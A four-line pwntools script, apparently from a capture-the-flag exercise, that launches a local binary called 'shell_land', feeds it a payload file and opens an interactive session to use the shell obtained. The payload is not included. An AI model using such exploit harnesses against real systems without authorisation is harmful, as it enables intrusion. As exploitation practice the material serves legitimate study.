from pwn import *
io = process('./shell_land')
io.send(open('payload.bin', 'rb').read())
io.interactive()
